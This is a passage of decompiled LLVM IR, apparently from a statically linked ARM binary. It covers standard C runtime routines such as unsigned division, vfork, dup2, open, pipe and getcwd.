  uselistorder label %dec_label_pc_eb0c, { 1, 0 }
  uselistorder label %dec_label_pc_eafc.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eae4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ea58, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e930, { 1, 0 }
  uselistorder label %dec_label_pc_e8bc, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f40c = load i32, i32* @r1, align 4
  %v1_f40c = add i32 %v0_f40c, -1
  store i32 %v1_f40c, i32* %r2.global-to-local, align 4
  %v2_f40c = icmp eq i32 %v0_f40c, 0
  %v7_f40c = icmp eq i32 %v0_f40c, 1
  %v0_f410 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_f40c, i32 %v0_f410)
  br i1 %v2_f40c, label %dec_label_pc_f4f4, label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %entry
  %v0_f418 = load i32, i32* %r0.global-to-local, align 4
  %v1_f418 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_f418, %v1_f418
  br i1 %tmp, label %dec_label_pc_f420, label %dec_label_pc_f4ac

dec_label_pc_f420:                                ; preds = %dec_label_pc_f418
  %v1_f420 = load i32, i32* %r2.global-to-local, align 4
  %v2_f420 = and i32 %v1_f420, %v1_f418
  %v4_f420 = icmp eq i32 %v2_f420, 0
  br i1 %v4_f420, label %dec_label_pc_f4b8, label %dec_label_pc_f428

dec_label_pc_f428:                                ; preds = %dec_label_pc_f420
  %v3_f428 = icmp ult i32 %v1_f418, 536870912
  br i1 %v3_f428, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f428
  %v4_f42c = mul i32 %v1_f418, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f428, %.thread
  %v0_f44c.pr36.ph = phi i32 [ %v4_f42c, %.thread ], [ %v1_f418, %dec_label_pc_f428 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f428 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_f44c.pr36 = phi i32 [ %v4_f440, %bb81 ], [ %v0_f44c.pr36.ph, %.preheader.preheader ]
  %v1_f444 = phi i32 [ %v4_f444, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_f438 = icmp ugt i32 %v0_f44c.pr36, 268435455
  br i1 %v2_f438, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f44cthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_f43c = icmp ult i32 %v0_f44c.pr36, %v0_f418
  br i1 %v4_f43c, label %bb80, label %dec_label_pc_f44cthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_f440 = and i32 %v0_f44c.pr36, 268435456
  %v3_f440 = icmp eq i32 %v2_f440, 0
  %v4_f440 = mul i32 %v0_f44c.pr36, 16
  br i1 %v3_f440, label %bb81, label %dec_label_pc_f44c.loopexit

bb81:                                             ; preds = %bb80
  %v2_f444 = and i32 %v1_f444, 268435456
  %v3_f444 = icmp eq i32 %v2_f444, 0
  %v4_f444 = mul i32 %v1_f444, 16
  br i1 %v3_f444, label %.preheader, label %dec_label_pc_f44cthread-pre-split.loopexit.loopexit

dec_label_pc_f44cthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_f45848.ph = phi i32 [ %v1_f444, %bb ], [ %v4_f444, %bb81 ]
  %v0_f44c.pr38.ph = phi i32 [ %v0_f44c.pr36, %bb ], [ %v4_f440, %bb81 ]
  br label %dec_label_pc_f44cthread-pre-split.loopexit

dec_label_pc_f44cthread-pre-split.loopexit:       ; preds = %dec_label_pc_f44cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_f45848 = phi i32 [ %v1_f444, %.thread2 ], [ %v1_f45848.ph, %dec_label_pc_f44cthread-pre-split.loopexit.loopexit ]
  %v0_f44c.pr38 = phi i32 [ %v0_f44c.pr36, %.thread2 ], [ %v0_f44c.pr38.ph, %dec_label_pc_f44cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f44cthread-pre-split

dec_label_pc_f44cthread-pre-split:                ; preds = %dec_label_pc_f44cthread-pre-split.loopexit, %bb83
  %v1_f45846 = phi i32 [ %v1_f45848, %dec_label_pc_f44cthread-pre-split.loopexit ], [ %v3_f458, %bb83 ]
  %v0_f44c.pr = phi i32 [ %v0_f44c.pr38, %dec_label_pc_f44cthread-pre-split.loopexit ], [ %v3_f454, %bb83 ]
  br label %dec_label_pc_f44c

dec_label_pc_f44c.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_f44c

dec_label_pc_f44c:                                ; preds = %dec_label_pc_f44c.loopexit, %dec_label_pc_f44cthread-pre-split
  %v1_f458 = phi i32 [ %v1_f45846, %dec_label_pc_f44cthread-pre-split ], [ %v1_f444, %dec_label_pc_f44c.loopexit ]
  %v1_f454 = phi i32 [ %v0_f44c.pr, %dec_label_pc_f44cthread-pre-split ], [ %v4_f440, %dec_label_pc_f44c.loopexit ]
  %v2_f44c = icmp slt i32 %v1_f454, 0
  br i1 %v2_f44c, label %dec_label_pc_f460, label %bb82

bb82:                                             ; preds = %dec_label_pc_f44c
  %v4_f450 = icmp ult i32 %v1_f454, %v0_f418
  br i1 %v4_f450, label %bb83, label %dec_label_pc_f460

bb83:                                             ; preds = %bb82
  %v3_f454 = mul i32 %v1_f454, 2
  %v2_f458 = icmp slt i32 %v1_f458, 0
  %v3_f458 = mul i32 %v1_f458, 2
  br i1 %v2_f458, label %dec_label_pc_f460, label %dec_label_pc_f44cthread-pre-split

dec_label_pc_f460:                                ; preds = %bb82, %dec_label_pc_f44c, %bb83
  %v2_f46c59 = phi i32 [ %v3_f458, %bb83 ], [ %v1_f458, %bb82 ], [ %v1_f458, %dec_label_pc_f44c ]
  %v1_f46451 = phi i32 [ %v3_f454, %bb83 ], [ %v1_f454, %bb82 ], [ %v1_f454, %dec_label_pc_f44c ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f464

dec_label_pc_f464:                                ; preds = %.thread11, %dec_label_pc_f460
  %v1_f498 = phi i32 [ %v4_f498, %.thread11 ], [ %v2_f46c59, %dec_label_pc_f460 ]
  %v1_f46c = phi i32 [ %v0_f4a4, %.thread11 ], [ 0, %dec_label_pc_f460 ]
  %v1_f49c = phi i32 [ %v4_f49c, %.thread11 ], [ %v1_f46451, %dec_label_pc_f460 ]
  %v1_f468 = phi i32 [ %v0_f494, %.thread11 ], [ %v0_f418, %dec_label_pc_f460 ]
  %v3_f464 = icmp ult i32 %v1_f468, %v1_f49c
  br i1 %v3_f464, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_f464
  %v3_f468 = sub i32 %v1_f468, %v1_f49c
  store i32 %v3_f468, i32* %r0.global-to-local, align 4
  %v3_f46c = or i32 %v1_f46c, %v1_f498
  store i32 %v3_f46c, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f464, %bb84
  %v1_f474 = phi i32 [ %v1_f468, %dec_label_pc_f464 ], [ %v3_f468, %bb84 ]
  %v1_f478 = phi i32 [ %v1_f46c, %dec_label_pc_f464 ], [ %v3_f46c, %bb84 ]
  %v4_f470 = udiv i32 %v1_f49c, 2
  %v6_f470 = icmp ult i32 %v1_f474, %v4_f470
  br i1 %v6_f470, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_f474 = urem i32 %v1_f49c, 2
  %v4_f474 = icmp eq i32 %v3_f474, 0
  %v6_f474 = sub i32 %v1_f474, %v4_f470
  store i32 %v6_f474, i32* %r0.global-to-local, align 4
  br i1 %v4_f474, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_f478 = udiv i32 %v1_f498, 2
  %v6_f478 = or i32 %v1_f478, %v5_f478
  store i32 %v6_f478, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_f480 = phi i32 [ %v6_f474, %bb85 ], [ %v1_f474, %.thread7 ], [ %v6_f474, %bb86 ]
  %v1_f484 = phi i32 [ %v1_f478, %bb85 ], [ %v1_f478, %.thread7 ], [ %v6_f478, %bb86 ]
  %v4_f47c = udiv i32 %v1_f49c, 4
  %v6_f47c = icmp ult i32 %v1_f480, %v4_f47c
  br i1 %v6_f47c, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_f480 = and i32 %v1_f49c, 2
  %v4_f480 = icmp eq i32 %v3_f480, 0
  %v6_f480 = sub i32 %v1_f480, %v4_f47c
  store i32 %v6_f480, i32* %r0.global-to-local, align 4
  br i1 %v4_f480, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f484 = udiv i32 %v1_f498, 4
  %v6_f484 = or i32 %v1_f484, %v5_f484
  store i32 %v6_f484, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_f48c = phi i32 [ %v6_f480, %bb87 ], [ %v1_f480, %.thread8 ], [ %v6_f480, %bb88 ]
  %v1_f490 = phi i32 [ %v1_f484, %bb87 ], [ %v1_f484, %.thread8 ], [ %v6_f484, %bb88 ]
  %v4_f488 = udiv i32 %v1_f49c, 8
  %v6_f488 = icmp ult i32 %v1_f48c, %v4_f488
  br i1 %v6_f488, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_f48c = and i32 %v1_f49c, 4
  %v4_f48c = icmp eq i32 %v3_f48c, 0
  %v6_f48c = sub i32 %v1_f48c, %v4_f488
  store i32 %v6_f48c, i32* %r0.global-to-local, align 4
  br i1 %v4_f48c, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f490 = udiv i32 %v1_f498, 8
  %v6_f490 = or i32 %v1_f490, %v5_f490
  store i32 %v6_f490, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_f4a4 = phi i32 [ %v1_f490, %bb89 ], [ %v1_f490, %.thread9 ], [ %v6_f490, %bb90 ]
  %v0_f494 = phi i32 [ %v6_f48c, %bb89 ], [ %v1_f48c, %.thread9 ], [ %v6_f48c, %bb90 ]
  %v2_f494 = icmp eq i32 %v0_f494, 0
  br i1 %v2_f494, label %dec_label_pc_f4a4, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_f498, 16
  br i1 %tmp138, label %dec_label_pc_f4a4, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_f498 = udiv i32 %v1_f498, 16
  %v4_f49c = udiv i32 %v1_f49c, 16
  br label %dec_label_pc_f464

dec_label_pc_f4a4:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_f4a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_f4a4

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f418
  %v9_f418 = icmp eq i32 %v0_f418, %v1_f418
  %. = zext i1 %v9_f418 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f420
  %v2_f4b8 = icmp ugt i32 %v1_f418, 65535
  br i1 %v2_f4b8, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_f4b8
  %v2_f4bc = and i32 %v1_f418, 32768
  %v3_f4bc = icmp eq i32 %v2_f4bc, 0
  %v4_f4bc = udiv i32 %v1_f418, 65536
  br i1 %v3_f4bc, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_f4b8
  %v0_f4c865 = phi i32 [ %v1_f418, %dec_label_pc_f4b8 ], [ %v4_f4bc, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_f4cc = phi i32 [ %v0_f4c865, %.thread16 ], [ %v4_f4bc, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_f4c8 = icmp ugt i32 %v1_f4cc, 255
  br i1 %v2_f4c8, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_f4cc = and i32 %v1_f4cc, 128
  %v3_f4cc = icmp eq i32 %v2_f4cc, 0
  %v4_f4cc = udiv i32 %v1_f4cc, 256
  br i1 %v3_f4cc, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_f4d0 = or i32 %storemerge, 8
  store i32 %v2_f4d0, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_f4dc = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_f4d0, %bb98 ]
  %v1_f4d8 = phi i32 [ %v1_f4cc, %bb96 ], [ %v4_f4cc, %bb97 ], [ %v4_f4cc, %bb98 ]
  %v2_f4d4 = icmp ugt i32 %v1_f4d8, 15
  br i1 %v2_f4d4, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_f4d8 = and i32 %v1_f4d8, 8
  %v3_f4d8 = icmp eq i32 %v2_f4d8, 0
  %v4_f4d8 = udiv i32 %v1_f4d8, 16
  br i1 %v3_f4d8, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f4dc = add nsw i32 %v1_f4dc, 4
  store i32 %v2_f4dc, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_f4e4 = phi i32 [ %v1_f4dc, %.thread17 ], [ %v1_f4dc, %bb99 ], [ %v2_f4dc, %bb100 ]
  %v5_f4e8 = phi i32 [ %v1_f4d8, %.thread17 ], [ %v4_f4d8, %bb99 ], [ %v4_f4d8, %bb100 ]
  %v2_f4e0 = icmp ugt i32 %v5_f4e8, 3
  %v7_f4e0 = icmp eq i32 %v5_f4e8, 4
  %v2_f4e4 = xor i1 %v7_f4e0, true
  %v3_f4e4 = and i1 %v2_f4e0, %v2_f4e4
  br i1 %v3_f4e4, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_f4e4 = add nsw i32 %v4_f4e4, 3
  store i32 %v5_f4e4, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_f4e8 = phi i32 [ %v4_f4e4, %.thread18 ], [ %v5_f4e4, %bb101 ]
  %v2_f4e8 = xor i1 %v2_f4e0, true
  %v3_f4e8 = or i1 %v7_f4e0, %v2_f4e8
  br i1 %v3_f4e8, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_f4e8 = udiv i32 %v5_f4e8, 2
  %v9_f4e8 = add i32 %v4_f4e8, %v8_f4e8
  store i32 %v9_f4e8, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_f4ec = phi i32 [ %v4_f4e8, %bb102 ], [ %v9_f4e8, %bb103 ]
  %v6_f4ec = lshr i32 %v0_f418, %v1_f4ec
  store i32 %v6_f4ec, i32* %r0.global-to-local, align 4
  ret i32 %v6_f4ec

dec_label_pc_f4f4:                                ; preds = %entry
  %v0_f4f8 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f4e8, { 1, 0 }
  uselistorder i1 %v7_f4e0, { 1, 0 }
  uselistorder i32 %v4_f4d8, { 1, 0 }
  uselistorder i32 %v1_f4d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f4d0, { 1, 0 }
  uselistorder i32 %v4_f4cc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f4cc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f4bc, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_f494, { 1, 0 }
  uselistorder i32 %v0_f4a4, { 1, 0, 2 }
  uselistorder i32 %v4_f488, { 1, 0 }
  uselistorder i32 %v1_f490, { 1, 2, 0 }
  uselistorder i32 %v4_f47c, { 1, 0 }
  uselistorder i32 %v1_f484, { 1, 2, 0 }
  uselistorder i32 %v4_f470, { 1, 0 }
  uselistorder i32 %v1_f478, { 1, 2, 0 }
  uselistorder i32 %v1_f49c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f46c, { 1, 0 }
  uselistorder i32 %v1_f498, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f458, { 1, 0 }
  uselistorder i32 %v3_f454, { 1, 0 }
  uselistorder i32 %v1_f454, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f458, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f444, { 1, 0 }
  uselistorder i32 %v4_f440, { 2, 1, 0 }
  uselistorder i32 %v1_f444, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f44c.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_f418, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_f418, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_f40c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f4a4, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f460, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f44cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f50c = udiv i32 %arg1, %arg2
  ret i32 %v2_f50c
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_f528 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_f528
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f550 = load i32, i32* @r0, align 4
  %v2_f550 = icmp ugt i32 %v0_f550, -4097
  br i1 %v2_f550, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_f550

bb1:                                              ; preds = %entry
  %v4_f55c = icmp eq i32 %v0_f550, -38
  br i1 %v4_f55c, label %dec_label_pc_f564, label %bb2

dec_label_pc_f564:                                ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_f564, %bb1
  %v0_f57c = call i32 @__syscall_error()
  ret i32 %v0_f57c
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f580 = load i32, i32* @r7, align 4
  store i32 %v3_f580, i32* %stack_var_-8, align 4
  %v0_f58c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f58c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f58c, -4095
  br i1 %tmp, label %dec_label_pc_f5ac, label %dec_label_pc_f59c

dec_label_pc_f59c:                                ; preds = %entry
  %v0_f59c = call i32 @__GI___errno_location()
  %v0_f5a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f5a0 = sub i32 0, %v0_f5a0
  %v2_f5a4 = inttoptr i32 %v0_f59c to i32*
  store i32 %v1_f5a0, i32* %v2_f5a4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f5ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f5ac

dec_label_pc_f5ac:                                ; preds = %entry, %dec_label_pc_f59c
  %v1_f5b0 = phi i32 [ %v0_f58c, %entry ], [ -1, %dec_label_pc_f59c ]
  %v2_f5ac = phi i32 [ %v3_f580, %entry ], [ %v2_f5ac.pre, %dec_label_pc_f59c ]
  store i32 %v2_f5ac, i32* @r7, align 4
  ret i32 %v1_f5b0

; uselistorder directives
  uselistorder i32 %v0_f58c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f5ac, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_f5b4 = load i32, i32* @r2, align 4
  %v9_f5b4 = load i32, i32* @r3, align 4
  store i32 %v9_f5b4, i32* %stack_var_-4, align 4
  %v1_f5c4 = and i32 %arg2, 64
  %v2_f5c4 = icmp eq i32 %v1_f5c4, 0
  br i1 %v2_f5c4, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_f5cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_f5cc, i32* @r3, align 4
  %phitmp = urem i32 %v6_f5b4, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_f5d0 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f5d0, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f600, label %dec_label_pc_f5f0

dec_label_pc_f5f0:                                ; preds = %.thread
  %v0_f5f0 = call i32 @__GI___errno_location()
  %v0_f5f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f5f4 = sub i32 0, %v0_f5f4
  store i32 %v1_f5f4, i32* @r3, align 4
  %v2_f5f8 = inttoptr i32 %v0_f5f0 to i32*
  store i32 %v1_f5f4, i32* %v2_f5f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %.thread, %dec_label_pc_f5f0
  %v0_f600 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_f5f0 ]
  ret i32 %v0_f600

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f600, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f614 = load i32, i32* @r7, align 4
  store i32 %v3_f614, i32* %stack_var_-8, align 4
  %v0_f620 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f620, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f620, -4095
  br i1 %tmp, label %dec_label_pc_f640, label %dec_label_pc_f630

dec_label_pc_f630:                                ; preds = %entry
  %v0_f630 = call i32 @__GI___errno_location()
  %v0_f634 = load i32, i32* %r7.global-to-local, align 4
  %v1_f634 = sub i32 0, %v0_f634
  %v2_f638 = inttoptr i32 %v0_f630 to i32*
  store i32 %v1_f634, i32* %v2_f638, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f640.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f640

dec_label_pc_f640:                                ; preds = %entry, %dec_label_pc_f630
  %v1_f644 = phi i32 [ %v0_f620, %entry ], [ -1, %dec_label_pc_f630 ]
  %v2_f640 = phi i32 [ %v3_f614, %entry ], [ %v2_f640.pre, %dec_label_pc_f630 ]
  store i32 %v2_f640, i32* @r7, align 4
  ret i32 %v1_f644

; uselistorder directives
  uselistorder i32 %v0_f620, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f640, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_f648 = load i32, i32* @r4, align 4
  %v6_f648 = load i32, i32* @r5, align 4
  %v9_f648 = load i32, i32* @r6, align 4
  %v12_f648 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_f64c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_f65c = icmp eq i32 %arg1, 0
  br i1 %v2_f64c, label %dec_label_pc_f65c, label %dec_label_pc_f68c

dec_label_pc_f65c:                                ; preds = %entry
  br i1 %v2_f65c, label %dec_label_pc_f678, label %dec_label_pc_f664

dec_label_pc_f664:                                ; preds = %dec_label_pc_f65c
  %v0_f664 = call i32 @__GI___errno_location()
  %v0_f668 = load i32, i32* @r6, align 4
  store i32 %v0_f668, i32* @r4, align 4
  %v2_f670 = inttoptr i32 %v0_f664 to i32*
  store i32 22, i32* %v2_f670, align 4
  br label %dec_label_pc_f724

dec_label_pc_f678:                                ; preds = %dec_label_pc_f65c
  %v0_f678 = call i32 @__GI_getpagesize()
  %v5_f680 = icmp slt i32 %v0_f678, 4096
  br i1 %v5_f680, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_f678
  store i32 %v0_f678, i32* @r7, align 4
  br label %dec_label_pc_f69c

bb16:                                             ; preds = %dec_label_pc_f678
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_f69c

dec_label_pc_f68c:                                ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_f65c, label %dec_label_pc_f69c, label %bb17

bb17:                                             ; preds = %dec_label_pc_f68c
  br label %dec_label_pc_f6b0

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f68c, %bb, %bb16
  %v0_f69c = phi i32 [ %v0_f678, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_f68c ]
  %v1_f6a0 = call i32 @malloc(i32 %v0_f69c)
  %v2_f6a4 = icmp eq i32 %v1_f6a0, 0
  br i1 %v2_f6a4, label %dec_label_pc_f720, label %dec_label_pc_f6ac

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f69c
  br label %dec_label_pc_f6b0

dec_label_pc_f6b0:                                ; preds = %bb17, %dec_label_pc_f6ac
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_f6a0, %dec_label_pc_f6ac ]
  %v0_f6f4 = phi i32 [ %arg1, %bb17 ], [ %v1_f6a0, %dec_label_pc_f6ac ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_f6f4, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_f6f4, -4095
  br i1 %tmp, label %dec_label_pc_f6dc, label %dec_label_pc_f6cc

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f6b0
  %v0_f6cc = call i32 @__GI___errno_location()
  %v0_f6d0 = load i32, i32* @r7, align 4
  %v1_f6d0 = sub i32 0, %v0_f6d0
  %v2_f6d4 = inttoptr i32 %v0_f6cc to i32*
  store i32 %v1_f6d0, i32* %v2_f6d4, align 4
  br label %dec_label_pc_f70c

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f6b0
  %v1_f6dc = icmp slt i32 %v0_f6f4, 0
  br i1 %v1_f6dc, label %dec_label_pc_f70c, label %dec_label_pc_f6e4

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f6dc
  %v0_f6e4 = load i32, i32* @r4, align 4
  %v2_f6e4 = icmp eq i32 %v0_f6e4, 0
  br i1 %v2_f6e4, label %bb18, label %dec_label_pc_f700.thread7

dec_label_pc_f700.thread7:                        ; preds = %dec_label_pc_f6e4
  br label %dec_label_pc_f724

bb18:                                             ; preds = %dec_label_pc_f6e4
  %v1_f6e8 = load i32, i32* @r6, align 4
  %v3_f6e8 = icmp eq i32 %v1_f6e8, 0
  br i1 %v3_f6e8, label %dec_label_pc_f700, label %dec_label_pc_f700.thread

dec_label_pc_f700.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_f700:                                ; preds = %bb18
  %v2_f6f8 = inttoptr i32 %v0_f6f4 to i32*
  %v3_f6f8 = call i32 @realloc(i32* %v2_f6f8, i32 %v0_f6f4)
  store i32 %v3_f6f8, i32* @r4, align 4
  %v2_f700 = icmp eq i32 %v3_f6f8, 0
  br i1 %v2_f700, label %dec_label_pc_f700.bb19_crit_edge, label %dec_label_pc_f724

dec_label_pc_f700.bb19_crit_edge:                 ; preds = %dec_label_pc_f700
  %v1_f704.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_f700.bb19_crit_edge, %dec_label_pc_f700.thread
  %v1_f704 = phi i32 [ %v1_f704.pre, %dec_label_pc_f700.bb19_crit_edge ], [ %v0_f6f4, %dec_label_pc_f700.thread ]
  store i32 %v1_f704, i32* @r4, align 4
  br label %dec_label_pc_f724

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f6dc, %dec_label_pc_f6cc
  %v0_f70c = load i32, i32* @r4, align 4
  %v2_f70c = icmp eq i32 %v0_f70c, 0
  br i1 %v2_f70c, label %dec_label_pc_f714, label %dec_label_pc_f720

dec_label_pc_f714:                                ; preds = %dec_label_pc_f70c
  %v0_f714 = load i32, i32* @r5, align 4
